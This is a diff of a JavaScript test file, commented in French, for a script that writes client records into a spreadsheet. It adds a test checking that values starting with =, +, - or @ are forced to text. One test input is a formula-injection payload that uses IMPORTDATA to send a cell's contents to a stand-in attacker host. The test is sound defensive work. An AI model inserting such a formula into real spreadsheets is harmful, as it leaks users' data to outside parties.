@@ -9,7 +9,8 @@ class Sheet {
   getName() { return this.name; }
   getMaxRows() { return this.max; }
   insertRowsAfter(after, n) { this.max += n; }
-  getDataRange() { return { getValues: () => this.grid.map((r) => r.slice()) }; }
+  // comme Google : une apostrophe en tête force le texte et n'est pas relue
+  getDataRange() { return { getValues: () => this.grid.map((r) => r.map((v) => (typeof v === 'string' && v[0] === "'" ? v.slice(1) : v))) }; }
   getRange(row, col) {
     const sh = this;
     return {
@@ -97,6 +98,17 @@ test('onglet Projets : R1 avec date, R2 sans date, mise à jour sans doublon', (
   r = envoyer(ss, jour({ clients: [{ ...clients[1], statut: 'r1', quand: '2026-11-13T09:00' }] }));
   assert.deepEqual([r.projets[0].row, r.projets[0].action], [6, 'mis à jour']);
   assert.equal(p.grid[5][5], 'R1');
+});
+
+test('pas d’injection de formule : = + - @ en tête forcés en texte', () => {
+  const p = projets(), ss = fake([mois(), p]);
+  const clients = [{ client: '=IMPORTDATA("https://evil.test/"&A1)', commentaire: '+33 6 12 34 56 78', statut: 'r2', quand: '' }];
+  envoyer(ss, jour({ clients }));
+  assert.deepEqual([p.grid[4][2], p.grid[4][7]], ["'=IMPORTDATA(\"https://evil.test/\"&A1)", "'+33 6 12 34 56 78"]);
+  const r = envoyer(ss, jour({ clients })); // renvoi : même ligne, pas de doublon
+  assert.deepEqual([r.projets[0].row, r.projets[0].action], [5, 'mis à jour']);
+  envoyer(ss, jour({ clients: [{ client: 'Garage', commentaire: 'normal', statut: 'r1', quand: '2026-11-12T10:00' }] }));
+  assert.equal(p.grid[5][2], 'Garage');
 });
 
 test('colonnes déplacées : retrouvées par leurs titres ; titres manquants : erreur', () => {
